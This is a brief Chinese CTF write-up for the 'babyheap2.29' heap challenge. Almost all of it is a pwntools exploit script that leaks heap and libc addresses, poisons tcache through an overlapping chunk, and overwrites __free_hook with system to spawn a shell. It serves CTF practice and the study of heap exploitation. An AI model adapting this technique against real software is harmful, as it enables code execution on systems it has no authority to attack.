# babyheap2.29

这是我能解的唯一一道题目了，哭了

新版本的libc


```python
from pwn import *

def cmd(c):
	p.recvuntil("Command: ")
	p.sendline(str(c))

def alloc(size):
	cmd(1)
	p.recvuntil("Size: ")
	p.sendline(str(size))

def edit(idx,size,content):
	cmd(2)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Content:")
	p.send(content)
	
def delete(idx):
	cmd(3)
	p.recvuntil("Index: ")
	p.sendline(str(idx))

def view(idx):
	cmd(4)
	p.recvuntil("Index: ")
	p.sendline(str(idx))

def main(host,port=1904):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./babyheap2.29",env={"LD_PRELOAD":"./libc-2.29.so"})  
		# p = process("./babyheap2.29.bak")
		gdb.attach(p,"b system")
	alloc(0xf8)		#0
	alloc(0xf8)		#1
	delete(0)
	delete(1)
	alloc(0xf8)		#0
	view(0)
	p.recvuntil("[0]: ")
	heap = u64(p.recv(6).ljust(8,"\x00"))-0x260
	
	info("heap : " + hex(heap))
	alloc(0x4f8)	#1
	alloc(0x4f8)	#2
	alloc(0x10)
	delete(1)	
	alloc(0x4f8)	#1
	view(1)
	p.recvuntil("[1]: ")
	libc = u64(p.recv(6).ljust(8,"\x00"))-0x1e4ca0
	# libc.address = u64(p.recv(6).ljust(8,"\x00"))-0x3ebca0
	# info("libc : " + hex(libc.address))
	info("libc : " + hex(libc))
	
	edit(1,0x4f8,p64(heap+0x450)*2+"\x00"*0x4e0+p64(0x500))
	delete(2)
	
	alloc(0x78)		#2
	delete(2)
	
	# edit(1,0x8,p64(libc.symbols["__free_hook"]))
	
	edit(1,0x8,p64(libc+0x1e75a8))
	alloc(0x78)		#2
	alloc(0x78)		#4
	# edit(4,0x8,p64(libc.symbols["system"]))
	
	edit(4,0x8,p64(libc+0x52fd0))
	edit(2,0x8,"/bin/sh\x00")
	delete(2)
	p.interactive()

if __name__ == "__main__":
	# libc = ELF("./libc.so.6",checksec=False)
	main(args['REMOTE'])

```
